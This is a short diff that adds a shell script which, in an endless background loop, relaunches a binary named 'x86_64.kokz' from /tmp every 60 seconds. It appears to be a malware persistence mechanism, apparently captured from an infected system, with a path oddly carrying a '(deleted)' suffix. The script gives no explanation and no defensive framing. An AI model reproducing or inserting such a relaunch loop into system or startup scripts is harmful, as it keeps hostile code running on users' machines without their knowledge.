@@ -1,0 +1,6 @@
+#!/bin/sh
+while true
+do
+/tmp/x86_64.kokz (deleted) startup &
+sleep 60
+done &
